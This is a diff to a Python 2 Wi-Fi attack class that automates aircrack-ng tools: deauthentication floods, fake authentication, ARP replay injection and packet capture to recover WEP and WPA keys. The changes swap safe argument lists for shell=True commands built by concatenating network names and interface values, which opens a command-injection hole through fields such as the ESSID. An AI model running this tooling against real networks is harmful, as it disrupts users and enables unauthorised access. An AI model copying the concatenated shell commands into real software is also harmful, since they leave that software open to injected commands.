@@ -1,4 +1,4 @@
-from subprocess import Popen, PIPE
+from subprocess import Popen, PIPE, STDOUT
 import os
 from sys import stdout
 from signal import SIGINT
@@ -49,16 +49,16 @@ class Attack():
         self.password_list  = './dict/password.lst'
 
     def channel_change(self):
+        pass
         cmd = ['iw', 'dev', self.iface, 'set', 'channel', self.channel]
         Popen(cmd, stdout=PIPE, stderr=DN)
 
     def wep_inject(self):
-        self.channel_change()
-        cmd = ['aireplay-ng', '-9', '--ignore-negative-one', '-e', self.essid, '-a', self.bssid, self.iface]
-        inject_proc = Popen(cmd, stdout=PIPE, stderr=DN)
-        inject_proc.wait()
-        out = inject_proc.communicate()
+        cmd = 'iw dev '+self.iface+' set channel '+self.channel+';aireplay-ng -9 --ignore-negative-one -e '+self.essid+' -a '+self.bssid+' '+self.iface
+        inject_proc = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+        out, err = inject_proc.communicate()
         try:
+            print out
             success = out[0].split('\n')[7]
             if success.find('30/30') == -1:
                 self.inject_sig = False
@@ -72,20 +72,10 @@ class Attack():
         max_attempts = 5  # Number of attempts to make
 
         for fa_index in xrange(1, max_attempts + 1):
-            self.channel_change()
-            cmd = ['aireplay-ng',
-                   '--ignore-negative-one',
-                    '-1', '0',  # Fake auth, no delay
-                    '-a', self.bssid,
-                    '-T', '1']  # Make 1 attempt
-            if self.essid != '':
-                cmd.append('-e')
-                cmd.append(self.essid)
-            cmd.append(self.iface)
-            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
-            self.proc_list.append(proc_fakeauth)
-            started = time.time()
+            cmd = 'iw dev '+self.iface+' set channel '+self.channel+';aireplay-ng -1 0 -T 1 -a '+self.bssid+' '+self.iface
+            proc_fakeauth = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
 
+            started = time.time()
             while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
             if time.time() - started > max_wait:
                 send_interrupt(proc_fakeauth)
@@ -94,18 +84,21 @@ class Attack():
                 continue
 
             result = proc_fakeauth.communicate()[0].lower()
-            if result.find('switching to shared key') != -1 or \
-                    result.find('rejects open system'): pass
+            print result
+
+            if result.find('switching to shared key') != -1 or result.find('rejects open system'):
+                pass
             if result.find('association successful') != -1:
                 self.fake_auth_sig = True
 
             stdout.flush()
             time.sleep(0.5)
             continue
+
         self.fake_auth_sig = False
 
     def send_deauths(self):
-        #self.channel_change()
+        self.channel_change()
         cmd = ['aireplay-ng',
                '--ignore-negative-one',
                '--deauth', '5',
@@ -143,7 +136,6 @@ class Attack():
             self.key = True
 
 
-
     def get_value(self):
         return_value = {'essid': self.essid,
                         'bssid': self.bssid,
@@ -155,7 +147,7 @@ class Attack():
 
     def wep_run(self):
         execute('rm -rf replay_arp*.cap')
-        self.channel_change()
+
         self.wep_inject()
 
         dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
@@ -185,6 +177,7 @@ class Attack():
                     try:
                         f = open('./log/' + self.bssid + '.key')
                         key = f.read()
+                        f.close()
                         self.key = str(key.decode('hex'))
                         self.crack_success = True
                         airodump_proc.kill()
@@ -201,8 +194,6 @@ class Attack():
         dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
         airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)
 
-        self.proc_list.append(airodump_proc)
-
         self.send_deauths()
         while self.key == '':
             output = commands.getoutput('tshark -r ./log/' + self.bssid + '-01.cap | grep "Message 4 of 4"')
@@ -216,6 +207,7 @@ class Attack():
                 try:
                     f = open('./log/' + self.bssid + '.key')
                     key = f.read()
+                    f.close()
                     self.key = key
                     self.crack_success = True
                     self.stop()
@@ -237,3 +229,11 @@ class Attack():
     def handler(self):
         self.stop()
         self.key = False
+'''
+#iface, channel, bssid, essid, enc_type
+at = Attack('atear_pentest', '5', '64:E5:99:5B:4A:C0', 'Norma_Test', 'WEP WEP')
+
+at.wep_inject()
+at.wep_fake_auth()
+at.wep_arp_send()
+'''
